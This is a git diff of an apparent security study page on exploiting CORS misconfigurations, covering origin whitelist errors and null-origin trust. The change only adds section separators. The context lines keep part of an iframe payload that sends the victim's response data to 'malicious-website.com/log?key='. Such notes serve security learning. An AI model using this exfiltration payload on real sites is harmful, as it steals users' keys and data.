@@ -122,6 +122,8 @@ function reqListener() {
 </script>
 ```
 
+***
+
 **Errors parsing Origin headers**
 
 * Some apps enable access from various sources through a whitelist of permitted origins
@@ -131,6 +133,8 @@ function reqListener() {
 {% hint style="info" %}
 **Note**: you need to know the whitelisted origins.
 {% endhint %}
+
+***
 
 **Whitelisted null origin value**
 
@@ -153,6 +157,8 @@ location='https://malicious-website.com/log?key='+this.responseText;
 };
 </script>"></iframe>
 ```
+
+***
 
 #### Exploiting XSS via CORS trust relationships <a href="#exploiting-xss-via-cors-trust-relationships" id="exploiting-xss-via-cors-trust-relationships"></a>
 
